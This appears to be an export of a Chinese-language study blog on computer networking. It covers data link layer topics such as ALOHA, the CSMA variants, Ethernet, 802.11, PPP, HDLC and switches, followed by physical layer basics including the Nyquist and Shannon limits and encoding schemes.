<p>因此，当有N个活跃节点时，时隙ALONA的效率是$Np(1-p)^{N-1}$。为了获得N个活跃节点的最大效率，就要求出是上诉表达式最大化的p。<img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105102317263.png" alt="image-20230105102317263"><br>所以，该协议的最大效率为1/e=0.37，因此该信道的有效传输效率不是R bps，而仅为0.37R bps。</p>
<h4 id="关于ALONA"><a href="#关于ALONA" class="headerlink" title="关于ALONA"></a>关于ALONA</h4><ol>
<li>纯ALONA比时隙ALONA吞吐量更低，效率更低</li>
<li>纯ALONA协议是想发就发，时隙ALONA只有在时间片段的开始才能发</li>
</ol>
<h3 id="CSMA协议"><a href="#CSMA协议" class="headerlink" title="CSMA协议"></a>CSMA协议</h3><p>载波监听多路访问协议CSMA</p>
<p>CS：载波侦听/监听，每一个站在发送数据之前要检测一下总线上是否有其他计算机在发送数据。<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105102722428.png" alt="image-20230105102722428"></p>
<p>MA：多点接入，表示许多计算机以多点接入的方式连接在一根总线上。<br>协议思想：发送帧之前，监听信道<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105103022996.png" alt="image-20230105103022996"></p>
<h4 id="1-坚持CSMA"><a href="#1-坚持CSMA" class="headerlink" title="1-坚持CSMA"></a>1-坚持CSMA</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105103222408.png" alt="image-20230105103222408"></p>
<h4 id="非坚持CSMA"><a href="#非坚持CSMA" class="headerlink" title="非坚持CSMA"></a>非坚持CSMA</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105103400804.png" alt="image-20230105103400804"></p>
<h4 id="p-坚持CSMA"><a href="#p-坚持CSMA" class="headerlink" title="p-坚持CSMA"></a>p-坚持CSMA</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105103607517.png" alt="image-20230105103607517"><br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105103836420.png" alt="image-20230105103836420"><br>但是如果发生冲突后还是会坚持把数据帧发送完，会造成浪费</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105103924946.png" alt="image-20230105103924946"></p>
<h3 id="CSMA-CD协议"><a href="#CSMA-CD协议" class="headerlink" title="CSMA/CD协议"></a>CSMA/CD协议</h3><p>载波监听多点接入/碰撞检测    CSMA/CD<br>CD：碰撞检测（冲突检测），“边发送边监听”，适配器边发送数据边检测信道上信号电压的变化，以便判断自己在发送数据时其他站是否也在发送数据。<br>所以可以看出应用于半双工网络。</p>
<h4 id="争用期-冲突窗口-碰撞窗口"><a href="#争用期-冲突窗口-碰撞窗口" class="headerlink" title="争用期/冲突窗口/碰撞窗口"></a>争用期/冲突窗口/碰撞窗口</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105105639147.png" alt="image-20230105105639147"></p>
<p>最多是两倍的总线端到端的传播时延$(2\tau)$，也成为争用期/冲突窗口/碰撞窗口<br>只要经过$2\tau$时间还没有检测到碰撞，就能肯定这次发送不会发生碰撞</p>
<h4 id="确定碰撞后的重传时机-截断二进制指数规避算法"><a href="#确定碰撞后的重传时机-截断二进制指数规避算法" class="headerlink" title="确定碰撞后的重传时机-截断二进制指数规避算法"></a>确定碰撞后的重传时机-截断二进制指数规避算法</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105112121278.png" alt="image-20230105112121278"></p>
<h4 id="最小帧长问题"><a href="#最小帧长问题" class="headerlink" title="最小帧长问题"></a>最小帧长问题</h4><p>帧的传输时延至少要两倍于信号在总线中的传播时延</p>
<script type="math/tex; mode=display">
\frac{帧长(bit)}{数据传输速率}\geq 2×传播时延=2\tau\\最小帧长=总线传播时延×数据传播速率×2=2\tau×数据传播速率</script><p>以太网规定最小帧长为64B，凡是长度小于64B的都是由于冲突而异常终止的无效帧</p>
<h3 id="CSMA-CA协议"><a href="#CSMA-CA协议" class="headerlink" title="CSMA/CA协议"></a>CSMA/CA协议</h3><p>载波监听多点接入/碰撞避免    CSMA/CA</p>
<p>为什么要有CSMA/CA?<br>——无线局域网中无法做到360°全面检测碰撞<br>——无线局域网中隐蔽站当A和C都检测不到信号，认为信道空闲时，同时向终端B发送数据帧，就会导致冲突。</p>
<h4 id="CSMA-CA协议工作原理"><a href="#CSMA-CA协议工作原理" class="headerlink" title="CSMA/CA协议工作原理"></a>CSMA/CA协议工作原理</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105200113880.png" alt="image-20230105200113880"></p>
<p>流程</p>
<ol>
<li>预约信道</li>
<li>ACK帧</li>
<li>RTS/CTS帧</li>
</ol>
<h3 id="CSMA-CD与CSMA-CA"><a href="#CSMA-CD与CSMA-CA" class="headerlink" title="CSMA/CD与CSMA/CA"></a>CSMA/CD与CSMA/CA</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105200538921.png" alt="image-20230105200538921"></p>
<h2 id="轮询访问介质访问控制"><a href="#轮询访问介质访问控制" class="headerlink" title="轮询访问介质访问控制"></a>轮询访问介质访问控制</h2><h3 id="轮询协议"><a href="#轮询协议" class="headerlink" title="轮询协议"></a>轮询协议</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230106164637824.png" alt="image-20230106164637824"></p>
<p>问题</p>
<ol>
<li>轮询开销</li>
<li>等待延迟</li>
<li>单点故障</li>
</ol>
<h3 id="令牌传输协议"><a href="#令牌传输协议" class="headerlink" title="令牌传输协议"></a>令牌传输协议</h3><p>逻辑上是环型拓扑，物理上是星型拓扑<br>令牌：一个特殊格式的MAC控制帧，不含任何信息。控制信道的使用，确保同一时刻只有一个结点独占信道。<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230106165147341.png" alt="image-20230106165147341" style="zoom: 75%;"></p>
<p>每个结点都可以在一定的时间内（令牌持有时间）获得发送数据的权力，并不是无限制地持有令牌</p>
<p>问题</p>
<ol>
<li>令牌开销</li>
<li>等待延迟</li>
<li>单点故障</li>
</ol>
<p>采用令牌传送方式的网络常用于负载较重、通信量较大的网络中。</p>
<h2 id="局域网基本概念和体系结构"><a href="#局域网基本概念和体系结构" class="headerlink" title="局域网基本概念和体系结构"></a>局域网基本概念和体系结构</h2><h3 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h3><p>局域网：简称LAN，是指在<strong>某一区域内</strong>由多台计算机互联成的计算机组，使用广播信道</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110210512470.png" alt="image-20230110210512470"></p>
<p>决定局域网的主要要素为：<strong>网络拓扑、传输介质</strong>与<strong>介质访问控制方法</strong>。</p>
<h3 id="局域网网络拓扑"><a href="#局域网网络拓扑" class="headerlink" title="局域网网络拓扑"></a>局域网网络拓扑</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110211041120.png" alt="image-20230110211041120"></p>
<h3 id="局域网传输介质"><a href="#局域网传输介质" class="headerlink" title="局域网传输介质"></a>局域网传输介质</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110211135392.png" alt="image-20230110211135392"></p>
<h3 id="局域网介质访问控制方法"><a href="#局域网介质访问控制方法" class="headerlink" title="局域网介质访问控制方法"></a>局域网介质访问控制方法</h3><ol>
<li>CSMA/CD    常用于总线型局域网，也用于树型网络</li>
<li>令牌总线      常用于总线型局域网，也用于树型网络<br>他总是把总线型或树型网络中的各个工作站按一定顺序如按接口地址大小排列形成一个逻辑环，只有令牌持有者才能控制总线，才有发送信息的权力</li>
<li>令牌环          用于环形局域网，如令牌环网</li>
</ol>
<h3 id="局域网的分类"><a href="#局域网的分类" class="headerlink" title="局域网的分类"></a>局域网的分类</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110212243343.png" alt="image-20230110212243343"></p>
<p>wifi是无线局域网的一种应用</p>
<h3 id="IEEE-802标准"><a href="#IEEE-802标准" class="headerlink" title="IEEE 802标准"></a>IEEE 802标准</h3><p>IEEE 802系列标准是IEEE 802 LAN/MAN 标准委员会制定的局域网、城域网技术标准（1980年2月成立）。其中最广泛使用的有以太网、令牌环、无线局域网等。这一系列标准中的每一个子标准都由委员会中的一个专门工作组负责。</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110212819213.png" alt="image-20230110212819213"></p>
<h3 id="MAC子层和LLC子层"><a href="#MAC子层和LLC子层" class="headerlink" title="MAC子层和LLC子层"></a>MAC子层和LLC子层</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110213455480.png" alt="image-20230110213455480"></p>
<h2 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110214227420.png" alt="image-20230110214227420"></p>
<h3 id="以太网提供无连接、不可靠的服务"><a href="#以太网提供无连接、不可靠的服务" class="headerlink" title="以太网提供无连接、不可靠的服务"></a>以太网提供无连接、不可靠的服务</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110214332996.png" alt="image-20230110214332996"></p>
<h3 id="以太网传输介质与拓扑结构的发展"><a href="#以太网传输介质与拓扑结构的发展" class="headerlink" title="以太网传输介质与拓扑结构的发展"></a>以太网传输介质与拓扑结构的发展</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110214631401.png" alt="image-20230110214631401"></p>
<h3 id="10BASE-T以太网"><a href="#10BASE-T以太网" class="headerlink" title="10BASE-T以太网"></a>10BASE-T以太网</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110214840419.png" alt="image-20230110214840419"></p>
<h3 id="适配器与MAC地址"><a href="#适配器与MAC地址" class="headerlink" title="适配器与MAC地址"></a>适配器与MAC地址</h3><p>计算机与外界有局域网的连接是通过<strong>通信适配器</strong><br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110215012301.png" alt="image-20230110215012301"><br>在局域网中，硬件地址又称为物理地址，或MAC地址。<br>MAC地址：每个适配器有一个全球唯一的48位二进制地址，前24位代表厂家（由IEEE规定)，后24位厂家自己指定。常用6个十六进制数表示，如02-60-8c-e4-b1-21</p>
<h3 id="以太网MAC帧"><a href="#以太网MAC帧" class="headerlink" title="以太网MAC帧"></a>以太网MAC帧</h3><p>最常用的MAC帧是以太网V2的格式<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110215629965.png" alt="image-20230110215629965"><br>源地址：发送发地址<br>目的地址：接收方地址<br>类型：指明网络层使用协议<br>数据：1500字节是规定，46字节来源于最小帧长64B<br>FCS：CRC检验码</p>
<p>与IEEE 802.3的区别：</p>
<ol>
<li>第三个字段是长度/类型</li>
<li>当长度/类型字段值小于0x0600时，数据字段必须装入LLC子层</li>
</ol>
<h3 id="高速以太网"><a href="#高速以太网" class="headerlink" title="高速以太网"></a>高速以太网</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110220711030.png" alt="image-20230110220711030"></p>
<h2 id="无线局域网"><a href="#无线局域网" class="headerlink" title="无线局域网"></a>无线局域网</h2><h3 id="802-11的MAC帧头格式"><a href="#802-11的MAC帧头格式" class="headerlink" title="802.11的MAC帧头格式"></a>802.11的MAC帧头格式</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111214301808.png" alt="image-20230111214301808"><br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111214504496.png" alt="image-20230111214504496"></p>
<h4 id="IBSS"><a href="#IBSS" class="headerlink" title="IBSS"></a>IBSS</h4><p>设备工作在IBSS模式下形成的网络，一般称为Ad Hoc网络。设备可以与通信范围内的所有其他设备形成通信链路。但是，当距离超过了通信范围后，设备在链路层上是无法直接进行数据传输的，除非所有设备在网络层使用了某种路由协议。</p>
<h4 id="BSS-amp-ESS"><a href="#BSS-amp-ESS" class="headerlink" title="BSS&amp;ESS"></a>BSS&amp;ESS</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111215302190.png" alt="image-20230111215302190"></p>
<p>BSS是WiFi最常用的网络结构。AP (Access Point)是BSS网络的创建者和管理者，所有设备与AP建立通信链路。普通设备之间进行通信，是需要AP进行转发的。STA 1要与STA 2进行通信时，经过的链路为STA 1$\rightarrow$AP$\rightarrow$STA2。一个AP和所有与它关联的设备组成一个BSS。多个AP可以设置相同的BSSID，并通过DS (Distribution System)进行连接，此时AP与所有设备形成的网络称为ESS。</p>
<h4 id="WDS"><a href="#WDS" class="headerlink" title="WDS"></a>WDS</h4><p>IEEE 802.11标准没有定义DS的具体实现形式，只要能为提供Portal和Integration功能集的系统都可以成为DS。DS可以是有线的，也可以通过无线系统实现。利用WiFi设备实现的DS，称为WDS (Wireless Distribution System)。在WDS中，WiFi设备利用了IEEE 802.11定义的4 地址帧结构，在链路层实现网络覆盖范围的扩展。但是，WDS是一种非标准模式，IEEE 802.11没有定义WDS的具体实现方式；现有的WDS系统完全依赖与WiFi芯片厂商的解决方案；来自不同厂商的设备在WDS模式下的兼容性很差。</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111215359245.png" alt="image-20230111215359245"></p>
<h4 id="MBSS"><a href="#MBSS" class="headerlink" title="MBSS"></a>MBSS</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111215420363.png" alt="image-20230111215420363"></p>
<p>MBSS是IEEE 802.11s定义的一种网络结构。与IBSS相似，设备可以与临近的其他设备直接进行通信。但是，与IBSS不同，MBSS有链路层的路由协议 (结合了树状路由和AODV)，即使两个设备之间的距离超过了通信范围，它们也是可以通过其他设备的转发实现通信。不同的MBSS也可以通过DS将Mesh Gateway连接起来，形成更大规模的网络。</p>
<h3 id="无线局域网的分类"><a href="#无线局域网的分类" class="headerlink" title="无线局域网的分类"></a>无线局域网的分类</h3><h4 id="有固定基础设施无线局域网"><a href="#有固定基础设施无线局域网" class="headerlink" title="有固定基础设施无线局域网"></a>有固定基础设施无线局域网</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111214629285.png" alt="image-20230111214629285"></p>
<h4 id="无固定基础设施无线局域网的自组织网络"><a href="#无固定基础设施无线局域网的自组织网络" class="headerlink" title="无固定基础设施无线局域网的自组织网络"></a>无固定基础设施无线局域网的自组织网络</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111215834139.png" alt="image-20230111215834139"></p>
<h2 id="广域网"><a href="#广域网" class="headerlink" title="广域网"></a>广域网</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111220018669.png" alt="image-20230111220018669"></p>
<h2 id="PPP协议"><a href="#PPP协议" class="headerlink" title="PPP协议"></a>PPP协议</h2><p>点对点协议PPP是目前使用最广泛的数据链路层协议，用户使用拨号电话接入因特网时一般都是用PPP协议。<br><strong>只支持全双工链路</strong></p>
<h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><ul>
<li>简单    对于链路层的帧，无需纠错，无需序号，无需流量控制</li>
<li>封装成帧    帧定界符</li>
<li>透明传输    与帧定界符一样比特组合的数据的处理方式：异步线路用字节填充，同步线路用比特填充</li>
<li>多种网络层协议    封装的IP数据报可以采用多种协议</li>
<li>多种类型链路    串行/并行，同步/异步，电/光。。。</li>
<li>差错检测    错就丢弃</li>
<li>检测连接状态    链路是否正常工作</li>
<li>最大传送单元    数据部分最大长度MTU</li>
<li>网络层地址协商   知道通信双方的网络层地址</li>
<li>数据压缩协商</li>
</ul>
<h3 id="无需满足的要求"><a href="#无需满足的要求" class="headerlink" title="无需满足的要求"></a>无需满足的要求</h3><ul>
<li>纠错</li>
<li>流量控制</li>
<li>序号</li>
<li>不支持多点线路</li>
</ul>
<h3 id="组成部分"><a href="#组成部分" class="headerlink" title="组成部分"></a>组成部分</h3><ol>
<li>一个将IP数据报封装到串行链路（同步串行/异步串行）的方法</li>
<li>链路控制协议LCP：建立并维护数据链路连接。身份验证</li>
<li>网络控制协议NCP：PPP可支持多种网络层协议，每个不同的网络层协议都要一个相应的NCP来配置，为网络层协议建立和配置逻辑连接。</li>
</ol>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111221238089.png" alt="image-20230111221238089"></p>
<h3 id="PPP协议的帧格式"><a href="#PPP协议的帧格式" class="headerlink" title="PPP协议的帧格式"></a>PPP协议的帧格式</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111221440739.png" alt="image-20230111221440739"></p>
<p><strong>PPP协议是面对字节的协议</strong></p>
<h2 id="HDLC协议"><a href="#HDLC协议" class="headerlink" title="HDLC协议"></a>HDLC协议</h2><p>高级数据链路控制，是一个在同步网上传输数据、面向比特的数据链路层协议，他是由国际标准化组织(ISO)根据IBM公司的SDLC协议扩展开发而成的。</p>
<p>数据报文可透明传输，用于实现透明传输的“0比特插入法”易于硬件实现 </p>
<p>采用全双工通信</p>
<p>所有帧采用<strong>CRC检验</strong>，对信息帧进行顺序<strong>编号</strong>，可防止漏收或重份，传输可靠性高</p>
<h3 id="HDLC的站"><a href="#HDLC的站" class="headerlink" title="HDLC的站"></a>HDLC的站</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111222021405.png" alt="image-20230111222021405"></p>
<h3 id="数据操作方式"><a href="#数据操作方式" class="headerlink" title="数据操作方式"></a>数据操作方式</h3><ol>
<li>正常响应方式：从站进行数据传输时需要经过主站的允许</li>
<li>异步平衡方式：所有站都可以不经过他站的允许就进行数据传输</li>
<li>异步响应方式：从站可以不经过主站允许就进行数据传输</li>
</ol>
<h3 id="HDLC的帧格式"><a href="#HDLC的帧格式" class="headerlink" title="HDLC的帧格式"></a>HDLC的帧格式</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111222437569.png" alt="image-20230111222437569"></p>
<h2 id="PPP协议-amp-HDLC协议"><a href="#PPP协议-amp-HDLC协议" class="headerlink" title="PPP协议&amp;HDLC协议"></a>PPP协议&amp;HDLC协议</h2><p>PPP协议可以实现字节填充也可以比特填充，HDLC协议只能进行比特填充<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111222613904.png" alt="image-20230111222613904"></p>
<h2 id="链路层设备"><a href="#链路层设备" class="headerlink" title="链路层设备"></a>链路层设备</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230112211130895.png" alt="image-20230112211130895"><br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230112211229605.png" alt="image-20230112211229605"></p>
<h3 id="链路层扩展以太网"><a href="#链路层扩展以太网" class="headerlink" title="链路层扩展以太网"></a>链路层扩展以太网</h3><h4 id="网桥"><a href="#网桥" class="headerlink" title="网桥"></a>网桥</h4><p>根据MAC帧的目的地址对帧进行转发和过滤。当网桥收到一个帧时，并不向所有接口转发此帧，而是先检查此帧的目的MAC地址，然后再确定将该帧转发到哪一个接口，或者是把他丢弃（即过滤）。<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230112211627769.png" alt="image-20230112211627769"></p>
<p>网桥优点：</p>
<ol>
<li>过滤通信量，增大吞吐量</li>
<li>扩大了物理范围</li>
<li>提高了可靠性</li>
<li>可互连不同物理层、不同MAC子层和不同速率的以太网</li>
</ol>
<h5 id="透明网桥"><a href="#透明网桥" class="headerlink" title="透明网桥"></a>透明网桥</h5><p>“透明”指以太网上的站点并不知道所发送的帧将经过哪几个网桥，是一种即插即用设备——自学习。<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230112212726678.png" alt="image-20230112212726678"></p>
<h5 id="源路由网桥"><a href="#源路由网桥" class="headerlink" title="源路由网桥"></a>源路由网桥</h5><p>在发送帧时，把详细的最佳路由信息（路由最少/时间最短）放在帧的首部中。<br>方法：源站以广播方式向欲通信的目的站发送一个发现帧。</p>
<h4 id="多接口网桥——以太网交换机"><a href="#多接口网桥——以太网交换机" class="headerlink" title="多接口网桥——以太网交换机"></a>多接口网桥——以太网交换机</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230112213344680.png" alt="image-20230112213344680"></p>
<h5 id="直通式交换机"><a href="#直通式交换机" class="headerlink" title="直通式交换机"></a>直通式交换机</h5><p>查完目的地址(6B)就立刻转发</p>
<p>延迟小，可靠性低，无法支持具有不同速率的端口的交换</p>
<h5 id="存储转发式交换机"><a href="#存储转发式交换机" class="headerlink" title="存储转发式交换机"></a>存储转发式交换机</h5><p>将帧放入告诉缓存，并检查是否正确，正确就转发，错误就丢弃。</p>
<p>延迟大，可靠性高，可以支持具有不同速率的端口的交换</p>
<h3 id="冲突域"><a href="#冲突域" class="headerlink" title="冲突域"></a>冲突域</h3><p>在同一个冲突域中的每一个节点都能收到所有被转发的帧，简单来说就是同一时间内只能有一台设备发送信息的范围。</p>
<h3 id="广播域"><a href="#广播域" class="headerlink" title="广播域"></a>广播域</h3><p>网络中能接收任一设备发出的广播帧的所有设备的集合。简单地说如果站点发出一个广播信号，所有能接收到这个信号的设备范围称为一个广播域。</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230112214111749.png" alt="image-20230112214111749"></p>
<p>链路层设备一个端口就是一个冲突域。l</p>
]]></content>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>物理层</title>
    <url>/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>计算机网络中物理层相关知识点</p>
<span id="more"></span>
<p>物理层解决如何在连接各种计算机的传输媒体上传输数据比特流，而不是指具体的传输媒体。</p>
<p>物理层主要任务：确定与传输媒体接口有关的一些特性——》定义标准</p>
<h2 id="物理层接口特性"><a href="#物理层接口特性" class="headerlink" title="物理层接口特性"></a>物理层接口特性</h2><ul>
<li>机械特性：定义物理连接的特性，规定物理连接时所采用的规格、接口形状、引线数目、引脚数量和排列情况</li>
<li>电气特性：规定传输二进制位时，线路上信号的电压范围、阻抗匹配、传输速率和距离限制等。</li>
<li>功能特性：指明某条线上出现的某一电平表示何种意义，接口部件的信号线的用途</li>
<li>规程特性：定义各条物理路线的工作规程和时序关系</li>
</ul>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103164153429-16727915428151.png" alt></p>
<p>通信的目的是传送消息（消息：语音、文字、图像、视频）<br>数据data：传送信息的实体，通常是有意义的符号序列<br>信号：数据的电气/电磁的表现，是数据在传输过程中的存在形式</p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103164340775-16727925592692.png" alt></p>
<p>信源：产生和发送数据的源头<br>信宿：接受数据的终点<br>信道：信号的传输媒介。一般用来表示向某一个方向发送信息的截止，因此一条通信线路往往包括一条发送信道和一条接收信道<br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103164620835-16727925621933.png" alt></p>
<h2 id="三种通信方式"><a href="#三种通信方式" class="headerlink" title="三种通信方式"></a>三种通信方式</h2><ol>
<li>单工通信：只有一个方向的通信而没有反方向的交互，仅需要一条信道。</li>
<li>半双工通信/双向交替通信：通信的双方都可以发送或接受信息，但任何一方都不能同时发送和接受，需要两条信道</li>
<li>全双工通信/双向同时通信：通信双方可以同时发送和接受信息，也需要两条信道</li>
</ol>
<h2 id="串行传输-amp-并行传输"><a href="#串行传输-amp-并行传输" class="headerlink" title="串行传输&amp;并行传输"></a>串行传输&amp;并行传输</h2><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103165209419-16727925643844.png" alt><br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103165149667-16727925664925.png" alt>常用于计算机内部数据传输</p>
<h2 id="同步传输-amp-异步传输"><a href="#同步传输-amp-异步传输" class="headerlink" title="同步传输&amp;异步传输"></a>同步传输&amp;异步传输</h2><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103165348925-16727925682396.png" alt></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103165536756-16727925698577.png" alt></p>
<h2 id="码元"><a href="#码元" class="headerlink" title="码元"></a>码元</h2><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103172027101-16727925714588.png" alt></p>
<p>1）码元传输速率：别名码元速率、波形速率、调制速率、符号速率等，单位是波特（Baud），单位时间内数字通信系统所传输的码元个数。码元速率与进制数无关，只与码元长度T有关$R_B=\frac{1}{T}(B)$<br>2）信息传输速率：别名信息速率、比特率等，单位时间内数字通信系统传输的二进制码元个数（即比特数），单位是比特/秒（b/s）</p>
<p>关系：若一个码元携带n bit的信息量，则M Baud的码元传输速率所对应的信息传输速率为M×n bit/s</p>
<p>例题：<br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103173331778-16727925738079.png" alt></p>
<h2 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h2><p>1.模拟信号系统中：当输入的信号频率高或低到一定程度，使得系统的输出功率成为输入功率的一半时，最高频率和最低频率间的差值就代表了系统的通频带宽，其单位为赫兹(Hz)</p>
<p>2.数字设备中：表示在单位时间内从网络中某一点到另一点所能通过的<strong>最高数据率</strong>/单位时间内通过链路的数量，常用来表示网络的通信线路所能传输数据的能力。单位是比特每秒(b/s)</p>
<h2 id="奈氏准则（奈奎斯特定理）"><a href="#奈氏准则（奈奎斯特定理）" class="headerlink" title="奈氏准则（奈奎斯特定理）"></a>奈氏准则（奈奎斯特定理）</h2><p>影响失真程度的因素：1.码元传输速率 2.信号传输距离 3.噪声干扰 4.传输媒体质量</p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103174800334-167279257601610.png" alt></p>
<p>奈氏准则：在理想低通（无噪声，带宽受限）条件下，为了避免码间串扰，极限码元传输速率为2W Baud，W是信道带宽，单位是Hz。</p>
<p>理想低通信道下的极限数据传输率=$2Wlog_2V(b/s)$，W：带宽(Hz)  V：几种码元/码元的离散电平数目</p>
<ol>
<li>在任何信道中，<strong>码元传输的速率是有上限的</strong>。若传输速率超过此上限，就会出现严重的码间串扰问题，使接收端对码元的完全正确识别成为不可能。</li>
<li>信道的频带越宽（即能通过的信号高频分量越多），就可以用更高的速率进行码元的有效传输。</li>
<li>奈氏准则给出了码元传输速率的限制，但并没有对信息传输速率给出限制</li>
<li>由于码元的传输速率受奈氏准则的制约，所以要提高数据的传输速率，就必须设法使每个码元能携带更多个比特的信息量，这就需要采用多元制的调制方法.</li>
</ol>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103182302698-167279257777511.png" alt></p>
<h2 id="香农定理"><a href="#香农定理" class="headerlink" title="香农定理"></a>香农定理</h2><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103182430898-167279257958412.png" alt></p>
<p>信噪比=信号的平均功率/噪声的平均功率，常记为S/N，并用分贝(dB)作为度量单位，即：</p>
<p>$信噪比(dB)=10log_{10}(S/N)$</p>
<p>在带宽受限且有噪声的信道中，为了不产生误差，信息的数据传输速率有上限值。</p>
<script type="math/tex; mode=display">
信道的极限数据传输速率=Wlog_2(1+S/N) (b/s)</script><p>推论<br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103183154787-167279258112513.png" alt></p>
<h3 id="奈氏准则和香农定理"><a href="#奈氏准则和香农定理" class="headerlink" title="奈氏准则和香农定理"></a>奈氏准则和香农定理</h3><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103183623766-167279258272014.png" alt></p>
<h2 id="编码与调制"><a href="#编码与调制" class="headerlink" title="编码与调制"></a>编码与调制</h2><h3 id="基带信号与宽带信号"><a href="#基带信号与宽带信号" class="headerlink" title="基带信号与宽带信号"></a>基带信号与宽带信号</h3><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103184846447-167279258414615.png" alt></p>
<p> <img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103185303037-167279258568616.png" alt></p>
<h3 id="数字数据编码为数字信号"><a href="#数字数据编码为数字信号" class="headerlink" title="数字数据编码为数字信号"></a>数字数据编码为数字信号</h3><p>1.非归零编码【NRZ】    2.曼切斯特编码    3.差分曼切斯特编码    4.归零编码【RZ】    5.反向不归零编码【NRZI】    6.4B/5B编码 </p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103190048155-167279258749817.png" alt></p>
